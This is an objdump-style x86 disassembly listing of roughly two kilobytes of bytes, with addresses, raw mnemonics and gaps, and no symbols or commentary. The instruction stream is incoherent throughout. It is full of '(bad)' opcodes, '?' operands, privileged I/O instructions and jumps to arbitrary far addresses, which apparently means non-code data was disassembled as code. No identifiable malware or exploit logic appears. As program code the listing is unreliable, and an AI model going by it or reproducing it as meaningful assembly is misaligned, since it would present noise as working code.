  4251f5:	mov    ah,0xe2
  4251f7:	mov    eax,ds:0x86e2f5e
  4251fc:	in     eax,dx
  4251fd:	in     al,0x74
  4251ff:	jb     0x4251b9
  425201:	ins    BYTE PTR es:[edi],dx
  425202:	pop    eax
  425203:	jo     0x4251e5
  425205:	fdiv   DWORD PTR [eax+0x65e46e76]
  42520b:	sub    dh,dl
  42520d:	outs   dx,BYTE PTR ds:[esi]
  42520e:	fadd   QWORD PTR [esi-0x9]
  425211:	in     eax,dx
  425212:	stos   DWORD PTR es:[edi],eax
  425213:	cmp    eax,0x33fc0b20
  425218:	adc    bh,dh
  42521a:	push   es
  42521b:	sub    dh,BYTE PTR [esi+edi*8+0x53bd2285]
  425222:	xchg   esi,eax
  425223:	lods   al,BYTE PTR ds:[esi]
  425224:	mov    ah,0xff
  425226:	lea    eax,[esi+0x1407b059]
  42522c:	in     eax,dx
  42522d:	inc    edx
  42522e:	mov    ebp,0x50fd3817
  425233:	fisubr DWORD PTR [eax+eax*1+0x0]
	...
  425293:	add    BYTE PTR [eax],al
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0xafd2aac5
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [ecx-0x2b],bh
  4252b0:	das    
  4252b1:	mov    BYTE PTR ds:0xe32817f0,dh
  4252b7:	cmp    eax,0x6d543d0b
  4252bc:	pop    ebx
  4252bd:	mov    dh,0x4f
  4252bf:	in     eax,dx
  4252c0:	sahf   
  4252c1:	jp     0x4252ca
  4252c3:	pop    ss
  4252c4:	aam    0xbc
  4252c6:	ds out 0x33,al
  4252c9:	xor    eax,0x12475070
  4252ce:	pop    edi
  4252cf:	(bad)  
  4252d0:	not    BYTE PTR [eax-0x4d078f47]
  4252d6:	pushf  
  4252d7:	icebp  
  4252d8:	shl    edi,cl
  4252da:	jbe    0x425297
  4252dc:	jmp    DWORD PTR [eax]
  4252de:	pushf  
  4252df:	mov    ah,0x8d
  4252e1:	jns    0x42530d
  4252e3:	mov    cs,WORD PTR [edx]
  4252e5:	outs   dx,BYTE PTR ds:[esi]
  4252e6:	ret    
  4252e7:	or     al,0xdc
  4252e9:	mov    bh,0xf0
  4252eb:	adc    edi,edx
  4252ed:	mov    cl,0xee
  4252ef:	lds    esi,FWORD PTR [ebx]
  4252f1:	out    0xab,al
  4252f3:	pop    esi
  4252f4:	bound  edi,QWORD PTR [ebx+0xfc6f9cf]
  4252fa:	ret    0xe943
  4252fd:	jmp    0xd1e782f7
  425302:	jmp    0x3533:0x64180337
  425309:	push   0x653ca502
  42530e:	call   0x2582:0x38d796fb
  425315:	or     BYTE PTR [ecx+0x3b],dl
  425318:	mov    ecx,0x8b5c7308
  42531d:	pop    ebx
  42531e:	inc    eax
  42531f:	(bad)  
  425320:	arpl   WORD PTR [ecx-0x54ae0aa3],dx
  425326:	loopne 0x4252b9
  425328:	(bad)  
  425329:	jmp    0x4252d2
  42532b:	int3   
  42532c:	push   ebp
  42532d:	pusha  
  42532e:	std    
  42532f:	xor    BYTE PTR [ebp+0x266a4b7c],0xb5
  425336:	mov    BYTE PTR [esi],ah
  425338:	data16 jae 0x425377
  42533b:	rcr    ah,0xd4
  42533e:	cmc    
  42533f:	or     eax,0x7f9d8eb6
  425344:	fucomip st,st(2)
  425346:	sub    bl,bh
  425348:	enter  0xaebb,0xe3
  42534c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42534d:	in     al,dx
  42534e:	pop    ecx
  42534f:	push   es
  425350:	in     eax,0x5c
  425352:	mov    ebx,0xc7e704e4
  425357:	xchg   edx,eax
  425358:	aad    0x1b
  42535a:	mov    bh,0xc2
  42535c:	xor    esp,eax
  42535e:	retf   
  42535f:	ds icebp 
  425361:	pop    ecx
  425362:	rcl    edi,1
  425364:	js     0x4253d7
  425366:	adc    al,0x44
  425368:	das    
  425369:	or     al,0x2c
  42536b:	sub    ah,dh
  42536d:	fnstsw WORD PTR [edx+edi*4+0x1d7f703f]
  425374:	xor    al,BYTE PTR [edx*8-0x425953e0]
  42537b:	bound  ebx,QWORD PTR [ebp-0x63f5ecf1]
  425381:	xor    DWORD PTR [ebx+0x7d],ecx
  425384:	repz add al,0x2d
  425387:	nop
  425388:	inc    esp
  425389:	dec    esi
  42538a:	mov    eax,ds:0x16d07f16
  42538f:	mov    ds:0xe86fb532,eax
  425394:	cmp    eax,0x45a3a376
  425399:	lods   eax,DWORD PTR ds:[esi]
  42539a:	in     eax,dx
  42539b:	cmp    bl,BYTE PTR [edx+0x5]
  42539e:	mov    ah,0x7f
  4253a0:	pop    es
  4253a1:	xchg   esi,eax
  4253a2:	dec    ebx
  4253a3:	xchg   edi,eax
  4253a4:	int3   
  4253a5:	iret   
  4253a6:	(bad)  
  4253a7:	shr    BYTE PTR [ebp-0x4c],1
  4253aa:	cmp    BYTE PTR [edx-0x1f373c43],dh
  4253b0:	aaa    
  4253b1:	or     ecx,DWORD PTR [ecx+0x4eca]
	...
  425413:	add    BYTE PTR [eax],al
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	xchg   dx,ax
  425424:	mov    ds:0x18cfc77,eax
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [edx+0x45],ch
  425430:	stos   DWORD PTR es:[edi],eax
  425431:	sub    al,0xd2
  425433:	rcr    DWORD PTR [ecx-0x1d4b98d8],0x83
  42543a:	pop    edx
  42543b:	inc    ecx
  42543c:	call   0xe2c7:0x83243855
  425443:	xchg   ecx,eax
  425444:	nop
  425445:	es push ebx
  425447:	lea    esi,[ebx+0x7beb2b2c]
  42544d:	je     0x4253d2
  42544f:	sbb    edi,DWORD PTR [ebx]
  425451:	xor    BYTE PTR [edx-0x2f],dl
  425454:	(bad)  
  425455:	xor    edx,DWORD PTR [eax]
  425457:	test   dh,dl
  425459:	xchg   ebx,eax
  42545a:	jno    0x4254b8
  42545c:	pop    es
  42545d:	cmc    
  42545e:	pop    esp
  42545f:	cmp    esp,eax
  425461:	pop    esp
  425462:	test   BYTE PTR [edx+eax*4+0x3a2ffd22],al
  425469:	addr16 popa 
  42546b:	cmp    al,0x20
  42546d:	push   cs
  42546e:	sub    ah,BYTE PTR es:[edi]
  425471:	enter  0x32be,0x64
  425475:	xchg   edi,eax
  425476:	mov    ah,0x97
  425478:	sbb    eax,0x9b5b7826
  42547d:	ror    DWORD PTR [eax+0x33aebe57],0x97
  425484:	rcl    edx,1
  425486:	mov    al,ds:0xec5d87a5
  42548b:	fistp  DWORD PTR [esi-0x64]
  42548e:	js     0x4254ff
  425490:	mov    dh,0x87
  425492:	cmp    al,0x12
  425494:	inc    edi
  425495:	xchg   DWORD PTR [edi+0xf],edx
  425498:	in     eax,0xc8
  42549a:	rol    BYTE PTR [edx+0x757057b8],cl
  4254a0:	shl    BYTE PTR [edi+eiz*4-0x637a733e],cl
  4254a7:	loope  0x4254f8
  4254a9:	mov    edi,0x11ac02e1
  4254ae:	mov    ds:0xbbfd0f98,eax
  4254b3:	mov    ds:0xced51713,al
  4254b8:	out    0xcb,al
  4254ba:	cmp    al,0x50
  4254bc:	fild   QWORD PTR [ebp+0x52]
  4254bf:	xor    eax,0x3599d746
  4254c4:	(bad)  
  4254c5:	stos   DWORD PTR es:[edi],eax
  4254c6:	int    0xa5
  4254c8:	je     0x4254b8
  4254ca:	sti    
  4254cb:	or     esp,DWORD PTR [ecx-0x2ab3582a]
  4254d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254d2:	jle    0x4254c5
  4254d4:	xchg   ecx,eax
  4254d5:	sar    ebx,cl
  4254d7:	mov    eax,0xdda7d66f
  4254dc:	imul   edi,DWORD PTR [ebx+0x66735d1c],0x40fef4b6
  4254e6:	push   esp
  4254e7:	cmp    eax,0xd57ffd74
  4254ec:	jg     0x425545
  4254ee:	sub    BYTE PTR [esi-0x7e],dl
  4254f1:	rcr    BYTE PTR [esp+edi*8],1
  4254f4:	aas    
  4254f5:	jb     0x425485
  4254f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254f8:	in     eax,dx
  4254f9:	dec    edx
  4254fa:	adc    esp,DWORD PTR [edi-0x5c]
  4254fd:	icebp  
  4254fe:	and    al,0x4d
  425500:	cld    
  425501:	push   0x1e
  425503:	jne    0x4254dc
  425505:	adc    DWORD PTR [eax-0x7c],ebp
  425508:	in     al,0x97
  42550a:	mov    ebp,ebp
  42550c:	adc    bl,BYTE PTR [esi]
  42550e:	sahf   
  42550f:	outs   dx,DWORD PTR ds:[esi]
  425510:	lods   eax,DWORD PTR ds:[esi]
  425511:	fs jl  0x4254c0
  425514:	popf   
  425515:	test   DWORD PTR [edx],ecx
  425517:	jno    0x4254aa
  425519:	dec    esi
  42551a:	aad    0x89
  42551c:	inc    ebp
  42551d:	retf   
  42551e:	int3   
  42551f:	imul   ebp,DWORD PTR [edx+edx*2-0x5cc2adba],0x72
  425527:	push   esi
  425528:	xor    BYTE PTR [ebx-0x30c53bb5],al
  42552e:	cli    
  42552f:	sahf   
  425530:	jne    0x425597
  425532:	rol    DWORD PTR [eax+0x7f],1
	...
  425595:	add    ah,al
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x3fc6
  4255a3:	mov    bh,0x9e
  4255a5:	push   edi
  4255a6:	add    ecx,DWORD PTR [esi+0x1070001]
  4255ac:	add    BYTE PTR [eax],al
  4255ae:	inc    ecx
  4255af:	enter  0xc732,0x18
  4255b3:	aaa    
  4255b4:	popw   ds
  4255b6:	fst    QWORD PTR [esi]
  4255b8:	std    
  4255b9:	cli    
  4255ba:	push   esi
  4255bb:	(bad)  
  4255bc:	mov    esp,0x26b05e3f
  4255c1:	push   ebp
  4255c2:	xlat   BYTE PTR ds:[ebx]
  4255c3:	or     bh,BYTE PTR [edi+edi*1]
  4255c6:	shl    DWORD PTR [ebx],1
  4255c8:	std    
  4255c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255ca:	adc    eax,0x45d7bb31
  4255cf:	jb     0x4255c3
  4255d1:	sahf   
  4255d2:	adc    al,dl
  4255d4:	stos   DWORD PTR es:[edi],eax
  4255d5:	dec    esp
  4255d6:	repnz push esp
  4255d8:	test   dh,al
  4255da:	pop    edx
  4255db:	inc    ebx
  4255dc:	pop    ss
  4255dd:	cli    
  4255de:	mov    WORD PTR [ebx+0x15e24eb9],gs
  4255e4:	mov    bh,0xa4
  4255e6:	cmp    DWORD PTR ds:0xcdadac58,edi
  4255ec:	fcomp  DWORD PTR [edi]
  4255ee:	fcmovnbe st,st(6)
  4255f0:	out    dx,eax
  4255f1:	pop    ebp
  4255f2:	inc    edx
  4255f3:	add    BYTE PTR [esi+ecx*1],0x8d
  4255f7:	imul   edx,esi,0xb138ab8c
  4255fd:	and    eax,0x967e9302
  425602:	dec    ebx
  425603:	loopne 0x425599
  425605:	sub    eax,0xb1a2cb58
  42560a:	jge    0x4255c6
  42560c:	int3   
  42560d:	ds pop esi
  42560f:	ja     0x42562e
  425611:	sub    al,0x6
  425613:	adc    ch,BYTE PTR ds:[ecx+0x4dfba133]
  42561a:	sbb    dh,BYTE PTR [ebx]
  42561c:	mov    al,0x52
  42561e:	lahf   
  42561f:	cmp    edx,DWORD PTR ds:0x60ec4da1
  425625:	push   ecx
  425626:	jle    0x425631
  425628:	loop   0x4255fd
  42562a:	mov    dl,0xa2
  42562c:	cmp    cl,bh
  42562e:	adc    eax,0xbe6c2649
  425633:	les    ebp,FWORD PTR [edx]
  425635:	out    dx,eax
  425636:	xchg   edi,eax
  425637:	adc    al,0xb
  425639:	(bad)  
  42563a:	gs mov ch,0x71
  42563d:	lods   al,BYTE PTR ds:[esi]
  42563e:	leave  
  42563f:	movups XMMWORD PTR [edx-0x23],xmm6
  425643:	icebp  
  425644:	lock hlt 
  425646:	xor    ch,0xc0
  425649:	mov    ebp,0x59e1b06e
  42564e:	sbb    al,0x93
  425650:	iret   
  425651:	les    edx,FWORD PTR [ecx+0x585b792]
  425657:	jbe    0x425658
  425659:	out    dx,al
  42565a:	in     eax,0xa8
  42565c:	je     0x425625
  42565e:	push   edx
  42565f:	mov    dl,0x6a
  425661:	sub    edx,DWORD PTR [ecx+edi*2+0x27]
  425665:	test   DWORD PTR [edi],ebx
  425667:	jge    0x4255fb
  425669:	adc    ecx,DWORD PTR [ebx]
  42566b:	mov    eax,0x7cd964b5
  425670:	fsubrp st(0),st
  425672:	mov    al,ds:0x35ce1d2c
  425677:	jg     0x425602
  425679:	jmp    0x41ae:0x33e8
  42567f:	int    0x62
  425681:	pop    ebp
  425682:	ret    0x7edd
  425685:	and    DWORD PTR [ecx-0x2923efdf],0xdf810e0
  42568f:	and    DWORD PTR [eax+0xb],esp
  425692:	ins    DWORD PTR es:[edi],dx
  425693:	in     eax,dx
  425694:	aad    0xc9
  425696:	test   al,0xa6
  425698:	in     al,0x75
  42569a:	dec    esi
  42569b:	push   eax
  42569c:	retf   0x37c9
  42569f:	lods   eax,DWORD PTR ds:[esi]
  4256a0:	leave  
  4256a1:	push   ss
  4256a2:	gs enter 0x5545,0x7b
  4256a7:	xlat   BYTE PTR ds:[ebx]
  4256a8:	jb     0x425634
  4256aa:	or     esp,esi
  4256ac:	not    BYTE PTR [ecx-0x783a74fe]
  4256b2:	pop    edi
  4256b3:	cmp    BYTE PTR [esi+0x0],bh
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x37f14f36],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	loope  0x42574f
  425730:	nop
  425731:	lods   eax,DWORD PTR ds:[esi]
  425732:	sbb    BYTE PTR [ecx],bh
  425734:	in     al,dx
  425735:	inc    BYTE PTR [edx-0x16]
  425738:	pop    ds
  425739:	push   eax
  42573a:	mov    edi,0xc0f6276
  42573f:	pop    ebp
  425740:	inc    esp
  425741:	sbb    eax,DWORD PTR [edi+0x4432ed41]
  425747:	mov    ch,0x9a
  425749:	inc    ebp
  42574a:	add    ecx,DWORD PTR [ebx+ecx*8]
  42574d:	lods   eax,DWORD PTR ds:[esi]
  42574e:	inc    edi
  42574f:	imul   edi,edx,0xffffffdb
  425752:	push   0xa64a8bde
  425757:	int3   
  425758:	lahf   
  425759:	mov    dh,BYTE PTR [edx]
  42575b:	mov    al,0xe
  42575d:	int    0x70
  42575f:	sti    
  425760:	in     al,dx
  425761:	dec    ebx
  425762:	fbstp  TBYTE PTR [esi+0x6d07ed87]
  425768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425769:	cli    
  42576a:	test   BYTE PTR [ecx],al
  42576c:	jnp    0x425718
  42576e:	aas    
  42576f:	sbb    eax,0x68c6a45f
  425774:	cdq    
  425775:	sub    eax,0xe290cac2
  42577a:	push   ss
  42577b:	rol    DWORD PTR [eax-0x36f3dced],1
  425781:	inc    esi
  425782:	pushf  
  425783:	cmp    eax,0xba9c8e24
  425788:	aaa    
  425789:	repnz xor BYTE PTR [ecx+0x35],al
  42578d:	test   DWORD PTR [esi],esi
  42578f:	sub    ebx,ebp
  425791:	push   ebp
  425792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425793:	sub    eax,0xe55b8609
  425798:	retf   0x855d
  42579b:	(bad)  
  42579f:	lods   al,BYTE PTR ds:[esi]
  4257a0:	std    
  4257a1:	imul   ecx,DWORD PTR [ebx+0x67265ef6],0xffffff93
  4257a8:	xchg   ebx,eax
  4257a9:	pushf  
  4257aa:	in     eax,dx
  4257ab:	mov    esi,0xe4204e85
  4257b0:	shr    DWORD PTR [edi],1
  4257b2:	repnz inc esi
  4257b4:	(bad)  
  4257b5:	fimul  WORD PTR [ecx]
  4257b7:	mov    al,0xd1
  4257b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257ba:	dec    esi
  4257bb:	fistp  DWORD PTR [esi-0x739ce5d9]
  4257c1:	out    dx,eax
  4257c2:	mov    cl,BYTE PTR [ebx-0x47]
  4257c5:	lock cmc 
  4257c7:	ins    BYTE PTR es:[edi],dx
  4257c8:	mov    esp,0x6b1bdc10
  4257cd:	or     DWORD PTR [edi-0x4fded744],0xfffffff6
  4257d4:	rol    DWORD PTR [ecx+ecx*2-0x5ff8265a],cl
  4257db:	xor    BYTE PTR [ebx-0x63],ah
  4257de:	sbb    edx,ebx
  4257e0:	aas    
  4257e1:	sub    ah,BYTE PTR [ecx-0x65]
  4257e4:	js     0x425809
  4257e6:	dec    BYTE PTR [eax]
  4257e8:	int    0x56
  4257ea:	in     al,0x30
  4257ec:	mov    edi,0xa19bef4b
  4257f1:	in     al,dx
  4257f2:	dec    ecx
  4257f3:	out    dx,al
  4257f4:	stos   BYTE PTR es:[edi],al
  4257f5:	ficom  WORD PTR [esi-0xd]
  4257f8:	les    eax,FWORD PTR [edx+ebx*4]
  4257fb:	sbb    BYTE PTR [ecx],ah
  4257fd:	not    dh
  4257ff:	cmp    al,0x7
  425801:	mov    bh,0x29
  425803:	stos   BYTE PTR es:[edi],al
  425804:	ror    DWORD PTR [edx],1
  425806:	inc    edx
  425807:	loopne 0x425832
  425809:	sahf   
  42580a:	push   es
  42580b:	adc    DWORD PTR [eax+0x5],0xd419ff12
  425812:	and    eax,DWORD PTR [ecx+eax*4]
  425815:	ficom  WORD PTR [edi]
  425817:	dec    edx
  425818:	fisubr WORD PTR [esi]
  42581a:	xor    al,0x98
  42581c:	je     0x4257a8
  42581e:	sbb    DWORD PTR [ebp-0xa7468a8],ecx
  425824:	shl    al,cl
  425826:	fs pop esi
  425828:	push   esp
  425829:	lods   al,BYTE PTR ds:[esi]
  42582a:	leave  
  42582b:	ret    
  42582c:	or     eax,0x85a08e6e
  425831:	xchg   bh,dh
  425833:	(bad)  
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x64c3cd7c,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	(bad)  
  4258af:	ds scas al,BYTE PTR es:[edi]
  4258b1:	pusha  
  4258b2:	into   
  4258b3:	cmc    
  4258b4:	aam    0x38
  4258b6:	add    dl,bl
  4258b8:	je     0x4258b9
  4258ba:	mov    eax,DWORD PTR [edx+0x2a66d570]
  4258c0:	dec    edx
  4258c1:	shl    DWORD PTR [edi+0x54a18906],cl
  4258c7:	mov    bh,0x3b
  4258c9:	punpcklwd mm7,DWORD PTR [edi+0x44cd3010]
  4258d0:	xchg   edx,eax
  4258d1:	cmp    edx,DWORD PTR [edi]
  4258d3:	mov    ds:0xbea0faed,al
  4258d8:	add    eax,0x5c718198
  4258dd:	repnz loop 0x4258e6
  4258e0:	jmp    0x42588d
  4258e2:	push   ecx
  4258e3:	dec    edi
  4258e4:	nop
  4258e5:	xor    DWORD PTR [ebx+0x1],ebp
  4258e8:	pop    ecx
  4258e9:	mov    ch,0x79
  4258eb:	das    
  4258ec:	pop    ebx
  4258ed:	sub    BYTE PTR [edi+0x133b555d],0xb9
  4258f4:	jle    0x4258bd
  4258f6:	push   ebp
  4258f7:	int    0xc2
  4258f9:	mov    ds:0x78d96d84,al
  4258fe:	(bad)  
  4258ff:	xchg   edx,eax
  425900:	call   0x8bbb:0xda4e9354
  425907:	jg     0x425920
  425909:	int    0x92
  42590b:	or     al,0xec
  42590d:	mov    ch,0x7c
  42590f:	loope  0x425901
  425911:	sub    DWORD PTR [ebx-0x4d262483],0x3746c54a
  42591b:	xchg   esp,eax
  42591c:	or     ebx,DWORD PTR [esi-0x3f]
  42591f:	and    cl,dl
  425921:	mov    edx,0x54c844d9
  425926:	repz imul esp,DWORD PTR [ebx-0x42],0xf
  42592b:	xchg   edx,eax
  42592c:	jp     0x4258c7
  42592e:	fst    QWORD PTR [ecx+0x59]
  425931:	shl    DWORD PTR [edx-0x57c255d4],cl
  425937:	add    eax,0x70354d4a
  42593c:	xchg   ebp,eax
  42593d:	mov    ch,dl
  42593f:	xor    DWORD PTR [ebx+0x6a],0x32469242
  425946:	xchg   dl,bh
  425948:	cli    
  425949:	or     eax,0xa987263e
  42594e:	lods   al,BYTE PTR ds:[esi]
  42594f:	sub    DWORD PTR [ebx*1+0x44c8f768],esp
  425956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425957:	sbb    dl,BYTE PTR [eax+0x67]
  42595a:	loope  0x4259cc
  42595c:	loop   0x425936
  42595e:	xor    eax,0xca39a5c8
  425963:	jns    0x4259b9
  425965:	jnp    0x425930
  425967:	dec    esp
  425968:	test   eax,0xac368651
  42596d:	shl    BYTE PTR [ecx],1
  42596f:	fwait
  425970:	cmp    DWORD PTR [esi+0x42],ebx
  425973:	inc    ecx
  425974:	into   
  425975:	loopne 0x4259f3
  425977:	fistp  QWORD PTR [edx]
  425979:	repz imul ecx,DWORD PTR [eax+edx*8-0x7c79a251],0x1fba4f5a
  425985:	ja     0x425983
  425987:	adc    dh,bh
  425989:	mov    ch,BYTE PTR [edx]
  42598b:	les    esp,FWORD PTR cs:[ebx]
  42598e:	and    al,dh
  425990:	dec    esi
  425991:	call   esp
  425993:	inc    ecx
  425994:	xor    eax,0xe6108d88
  425999:	pop    edx
  42599a:	pop    ss
  42599b:	clc    
  42599c:	push   ebp
  42599d:	mov    ecx,DWORD PTR [edi+0x47]
  4259a0:	sub    BYTE PTR [edx-0x22ac9612],bl
  4259a6:	or     al,0xd7
  4259a9:	xchg   DWORD PTR [ecx],esi
  4259ab:	sub    ah,bh
  4259ad:	das    
  4259ae:	inc    edx
  4259af:	ins    DWORD PTR es:[edi],dx
  4259b0:	test   DWORD PTR [edx-0x59],0x50c1
	...
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x9f0fe11
  425a24:	shr    DWORD PTR [eax+0x18],1
  425a27:	xchg   ecx,eax
  425a28:	add    DWORD PTR [eax],eax
  425a2a:	pop    es
  425a2b:	add    DWORD PTR [eax],eax
  425a2d:	add    BYTE PTR [edi+0x7c64690],ch
  425a33:	dec    edi
  425a34:	xor    al,BYTE PTR [ebp-0x3f]
  425a37:	xchg   BYTE PTR [esi],ah
  425a39:	into   
  425a3a:	into   
  425a3b:	push   es
  425a3c:	arpl   bp,si
  425a3e:	out    0xf5,eax
  425a40:	pop    ds
  425a41:	fld    QWORD PTR [ebx-0x61]
  425a44:	ror    DWORD PTR [edx+ebx*8],0x96
  425a48:	shl    BYTE PTR [ecx+0x10],1
  425a4b:	xchg   ebx,eax
  425a4c:	cs mov bh,0xd3
  425a4f:	gs mov al,0x5
  425a52:	pop    edx
  425a53:	push   esi
  425a54:	mov    cl,BYTE PTR [eax-0x3ca59951]
  425a5a:	push   ecx
  425a5b:	sahf   
  425a5c:	mov    al,ds:0x7777b165
  425a61:	and    DWORD PTR [edx+0x12],esi
  425a64:	fdivr  DWORD PTR [ebx-0x53aa1840]
  425a6a:	dec    ecx
  425a6b:	inc    ebp
  425a6c:	fisttp DWORD PTR [ebp+0x279ee830]
  425a72:	sub    BYTE PTR ds:0xafb565a0,ah
  425a78:	clc    
  425a79:	mov    ss,WORD PTR [esi+edx*4-0x75]
  425a7d:	or     bh,BYTE PTR [ecx]
  425a7f:	scas   eax,DWORD PTR es:[edi]
  425a80:	dec    ebp
  425a81:	adc    ch,BYTE PTR [edi+0x5a]
  425a84:	stos   DWORD PTR es:[edi],eax
  425a85:	add    cl,BYTE PTR [eax+ebx*8-0x2e]
  425a89:	fcom   QWORD PTR [edx]
  425a8b:	pop    ebp
  425a8c:	vmwrite ebp,DWORD PTR [edx-0x31]
  425a90:	cmp    al,0x81
  425a92:	frstor [eax]
  425a94:	pop    ebp
  425a95:	xlat   BYTE PTR ds:[ebx]
  425a96:	out    0xb1,al
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	mov    cl,0x2c
  425a9b:	in     al,0x79
  425a9d:	int    0xc2
  425a9f:	adc    eax,0x44b6e336
  425aa4:	xor    BYTE PTR [eax+0x5ca5b97],dl
  425aaa:	aas    
  425aab:	push   esp
  425aac:	loopne 0x425b10
  425aae:	ret    0x33cb
  425ab1:	jp     0x425af3
  425ab3:	adc    BYTE PTR [esi-0x3d7b5751],cl
  425ab9:	cs pop eax
  425abb:	fwait
  425abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425abd:	(bad)  
  425abe:	or     DWORD PTR [ebx+0x41],ebp
  425ac1:	test   al,0xf0
  425ac3:	aaa    
  425ac4:	(bad)  
  425ac5:	xor    eax,0xb0515982
  425aca:	jnp    0x425adc
  425acc:	adc    eax,0x28b6cf15
  425ad1:	xchg   edi,eax
  425ad2:	scas   al,BYTE PTR es:[edi]
  425ad3:	shl    BYTE PTR [ecx+0x3bc5578a],0x33
  425ada:	jp     0x425a6f
  425adc:	sbb    DWORD PTR [ebp+ebx*8-0x75136994],edi
  425ae3:	fnstsw WORD PTR [esi-0x6e50e546]
  425ae9:	lds    edx,FWORD PTR [edx+ebx*4+0x74b88369]
  425af0:	shr    BYTE PTR [ebx],1
  425af2:	pop    ebx
  425af3:	mov    cl,0x2a
  425af5:	imul   ebp,DWORD PTR [edx+ecx*8-0x4f],0xffffffe8
  425afa:	sti    
  425afb:	xchg   edi,eax
  425afc:	aad    0x57
  425afe:	sbb    DWORD PTR [esi+0x75],0x9c032563
  425b05:	rcl    DWORD PTR [edx+0x6],cl
  425b08:	ficom  DWORD PTR [esp+ebx*1-0x1e]
  425b0c:	xchg   esp,eax
  425b0d:	inc    edi
  425b0e:	inc    esi
  425b0f:	xchg   DWORD PTR [ecx],esp
  425b11:	cmp    al,0x79
  425b13:	arpl   WORD PTR [ebx+0x5e720be],cx
  425b19:	dec    ecx
  425b1a:	pushf  
  425b1b:	lea    esi,[ebp-0x4a]
  425b1e:	outs   dx,DWORD PTR ds:[esi]
  425b1f:	mov    ss,WORD PTR [edi+ecx*2]
  425b22:	add    ch,BYTE PTR ss:[edx+edx*2+0x1bf7f283]
  425b2a:	mov    esi,0xbd47195d
  425b2f:	jl     0x425b77
  425b31:	enter  0x2227,0xc5
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x95a5aad3
  425ba3:	scas   al,BYTE PTR es:[edi]
  425ba4:	sar    BYTE PTR [ebx+0x1921f],1
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [edi*4-0x6082907b],bl
  425bb4:	xor    edi,esp
  425bb6:	lds    esp,FWORD PTR [edx]
  425bb8:	inc    esp
  425bb9:	pop    ebp
  425bba:	retf   
  425bbb:	call   0x8f1c:0xb9161aaf
  425bc2:	pushf  
  425bc3:	lahf   
  425bc4:	clc    
  425bc5:	fwait
  425bc6:	dec    edi
  425bc7:	sbb    DWORD PTR [eax-0x7b],edx
  425bca:	addr16 push 0x40
  425bcd:	xchg   edx,eax
  425bce:	sahf   
  425bcf:	jo     0x425bdc
  425bd1:	mov    edi,0x6b712c11
  425bd6:	jne    0x425c24
  425bd8:	icebp  
  425bd9:	jne    0x425b6d
  425bdb:	mov    gs,WORD PTR [eax+0x6d]
  425bde:	call   0xd7086188
  425be3:	dec    esi
  425be4:	sbb    esp,ecx
  425be6:	out    dx,eax
  425be7:	cmp    ch,dl
  425be9:	or     eax,0x920b2f80
  425bee:	pop    esi
  425bef:	imul   ebx,ebp,0x4be829e6
  425bf5:	mov    WORD PTR [ecx+0x14],cs
  425bf8:	mov    ebp,0x12bfa3f8
  425bfd:	mov    ah,0x92
  425bff:	sbb    BYTE PTR [edx],ah
  425c01:	dec    esi
  425c02:	inc    ebp
  425c03:	add    bh,al
  425c05:	inc    edi
  425c06:	enter  0xc982,0xf0
  425c0a:	pop    edi
  425c0b:	ficom  WORD PTR [ebx+0x1f]
  425c0e:	lahf   
  425c0f:	sbb    esi,edi
  425c11:	in     al,0x66
  425c13:	add    dl,ah
  425c15:	pushf  
  425c16:	aad    0x93
  425c18:	inc    edx
  425c19:	adc    al,0x55
  425c1b:	mov    ?,WORD PTR [edi]
  425c1d:	mov    ?,WORD PTR [eax+0x13981ab7]
  425c23:	cmp    DWORD PTR [esi+0x29d115d6],esp
  425c29:	mov    eax,ds:0xbbdc33a0
  425c2e:	(bad)  
  425c2f:	cmp    eax,0x33b0ac40
  425c34:	data16 mov ah,0xb9
  425c37:	(bad)  
  425c38:	stc    
  425c39:	mov    edx,0xf2a13311
  425c3e:	leave  
  425c3f:	lahf   
  425c40:	pop    ebx
  425c41:	jg     0x425c67
  425c43:	jns    0x425c22
  425c45:	cli    
  425c46:	or     dl,BYTE PTR [esi+0x21]
  425c49:	sbb    DWORD PTR [ecx+0x377a5895],eax
  425c4f:	out    dx,al
